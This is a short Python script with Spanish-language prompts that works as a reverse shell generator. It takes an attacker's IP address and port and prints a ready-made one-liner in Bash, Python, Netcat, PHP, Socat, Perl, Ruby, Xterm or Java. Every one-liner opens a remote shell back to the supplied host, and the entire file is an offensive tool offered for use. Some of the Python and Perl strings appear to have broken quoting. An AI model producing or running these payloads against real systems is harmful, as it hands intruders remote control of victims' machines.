#Reverse_Shell Generator

print("[+] Tipos de Shell disponibles:")
print("\t+ Bash\n\t+ Python\n\t+ Netcat\n\t+ Php\n\t+ Socat\n\t+ Perl\n\t+ Ruby\n\t+ Xterm\n\t+ Java")
Shell_type = str(input("[+] Elija un tipo de Shell -> "))
IP = str(input("[+] Ingresa la dirección IP a donde quieres enviar la Shell -> "))
Port = str(input("[+] Ingresa el puerto por donde quieres recibir la Shell -> "))

if (Shell_type == "Bash"):
  print(f"[+] Reverse Shell Bash:\n bash -i >& /dev/tcp/{IP}/{Port} 0>&1")
elif (Shell_type == "Python"):
  print(f"[+] Reverse Shell Python:\n python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{IP}',{Port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);'")
elif (Shell_type == "Netcat"):
  print(f"[+] Reverse Shell Netcat:\n nc -e /bin/sh {IP} {Port}")
elif (Shell_type == "Php"):
  print(f"[+] Reverse Shell Php:\n php -r '$sock=fsockopen('{IP}',{Port});exec('/bin/sh -i <&3 >&3 2>&3');'")
elif (Shell_type == "Socat"):
  print(f"[+] Reverse Shell Socat:\n socat tcp-connect:{IP}:{Port} system:/bin/sh")
elif (Shell_type == "Perl"):
  print(f"[+] Reverse Shell Perl:\n perl -e 'use Socket;$i='{IP}';$p={Port};socket(S,PF_INET,SOCK_STREAM,getprotobyname('name'));if(connect(S,sockaddr_in($p,inet_aton($i)))){'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'};'")
elif (Shell_type == "Ruby"):
  print(f"[+] Reverse Shell Ruby:\n ruby -rsocket -e'f=TCPSocket.open('{IP}',{Port}).to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)'")
elif (Shell_type == "Xterm"):
  print(f"[+] Reverse Shell Xterm:\n xterm -display {IP}:{Port}")
elif (Shell_type == "Java"):
  print(f"[+] Reverse Shell Java:\n r = Runtime.getRuntime()\n p = r.exec(['/bin/bash','-c','exec 5<>/dev/tcp/{IP}/{Port};cat <& 5 | while read line; do \$line 2>&5; done'] as String[])\n p.waitFor()")
else:
  print(f"[!] A ocurrido un error al elegir el tipo de Shell. Prueba a poner la primera letra en mayúscula :)")